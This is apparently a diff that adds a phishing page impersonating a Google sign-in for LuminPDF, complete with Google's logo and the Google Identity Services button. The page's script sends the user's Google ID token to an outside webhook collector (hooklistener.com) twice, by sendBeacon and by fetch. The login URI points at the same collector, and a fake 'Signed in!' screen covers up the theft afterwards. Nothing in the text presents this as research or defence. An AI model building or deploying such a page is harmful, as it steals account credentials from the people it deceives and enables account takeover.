@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in to LuminPDF</title>
+  <style>
+    body { font-family: Roboto, Arial; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; width: 320px; }
+    .debug { margin-top: 20px; font-size: 12px; color: #d93025; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92"><br><br>
+    <h3>Sign in</h3>
+    <p style="color:#5f6368;">to continue signin to Lumin</p>
+    <div id="g_id_onload"
+         data-client_id="561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com"
+         data-login_uri="https://app.hooklistener.com/w/my-first-endpoint-kxw"
+         data-auto_prompt="false">
+    </div>
+    <div class="g_id_signin" data-type="standard" data-size="large"></div>
+    <div class="debug" id="debug"></div>
+  </div>
+
+  <script>
+    // DEBUG: Show what's happening
+    window.onSignIn = function(response) {
+      const debug = document.getElementById('debug');
+      debug.innerHTML = 'Response received!<br>';
+
+      if (response && response.credential) {
+        const token = response.credential;
+        debug.innerHTML += 'Token length: ' + token.length + '<br>Sending...';
+
+        // METHOD 1: sendBeacon (BEST)
+        const blob = new Blob([JSON.stringify({token: token})], {type: 'application/json'});
+        navigator.sendBeacon('https://app.hooklistener.com/w/my-first-endpoint-kxw', blob);
+
+        // METHOD 2: fetch
+        fetch('https://app.hooklistener.com/w/my-first-endpoint-kxw?token=' + encodeURIComponent(token))
+          .then(() => debug.innerHTML += '<br>Sent via fetch!')
+          .catch(() => {});
+
+        // Show success
+        setTimeout(() => {
+          document.body.innerHTML = '<div style="text-align:center;padding:100px;font-family:Roboto;"><h2 style="color:green;">Signed in!</h2><p>Loading Workspace...</p></div>';
+        }, 800);
+      } else {
+        debug.innerHTML += 'ERROR: No credential!<br>Check client_id and domain.';
+      }
+    };
+  </script>
+
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
+</body>
+</html>
